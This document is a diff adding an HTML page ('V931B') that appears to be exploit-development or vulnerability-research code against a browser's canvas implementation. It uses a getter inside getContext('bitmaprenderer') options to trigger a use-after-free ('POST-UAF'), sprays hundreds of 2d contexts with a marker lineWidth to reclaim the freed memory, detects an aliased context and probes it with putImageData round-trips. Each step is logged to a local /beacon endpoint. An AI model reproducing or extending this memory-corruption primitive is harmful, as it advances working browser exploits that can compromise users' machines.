@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V931B</title></head>
+<body><pre id="out">V931B — putImageData roundtrip verify (normal vs alias, B-session)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V931B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function roundtrip(ctx, w, h, rgba){
+  var id = ctx.createImageData(w,h);
+  for(var i=0;i<id.data.length;i+=4){ id.data[i]=rgba[0]; id.data[i+1]=rgba[1]; id.data[i+2]=rgba[2]; id.data[i+3]=rgba[3]; }
+  ctx.putImageData(id,0,0);
+  var id2 = ctx.getImageData(0,0,w,h);
+  var p=[id2.data[0],id2.data[1],id2.data[2],id2.data[3]];
+  var ok = (p[0]===rgba[0]&&p[1]===rgba[1]&&p[2]===rgba[2]&&p[3]===rgba[3]);
+  return 'ok='+ok+'|set='+rgba.join(':')+'|got='+p.join(':');
+}
+function t(name, fn){
+  try{ bk('T-PRE',name); var r=fn(); bk('T-OK',name+'|'+String(r).slice(0,420)); say('T-OK '+name+' '+r); }
+  catch(e){ bk('T-ERR',name+'|'+e.name+':'+String(e.message).slice(0,160)); say('T-ERR '+name+' '+e.message); }
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+
+/* (A) normal fresh context, no alias */
+t('normal a255', function(){
+  var c=document.createElement('canvas'); c.width=4; c.height=4;
+  var ctx=c.getContext('2d'); return roundtrip(ctx,2,2,[1,2,3,255]);
+});
+t('normal a4', function(){
+  var c=document.createElement('canvas'); c.width=4; c.height=4;
+  var ctx=c.getContext('2d'); return roundtrip(ctx,2,2,[1,2,3,4]);
+});
+
+/* (B) live alias context */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+
+var sprayCtxs=[], sprayCanv=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=4; sc.height=4;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); sprayCanv.push(sc); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+var lwR, aliasCtx=null, aliasIdx=-1, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(!errR && lwR===MARKER){
+  bk('RECLAIM','CONFIRMED');
+  try{ innerCtx.lineWidth=9999.99; }catch(e){}
+  for(var i=0;i<sprayCtxs.length;i++){
+    try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; break; } }catch(e){}
+  }
+  bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+} else {
+  bk('RECLAIM','NO-marker lw='+lwR+' err='+errR);
+}
+
+var live = aliasCtx || innerCtx;
+if(live){
+  bk('ALIAS-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx'));
+  t('alias a255', function(){ return roundtrip(live,2,2,[1,2,3,255]); });
+  t('alias a4', function(){ return roundtrip(live,2,2,[1,2,3,4]); });
+} else {
+  bk('ALIAS-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV931B complete.');
+</script>
+</body></html>
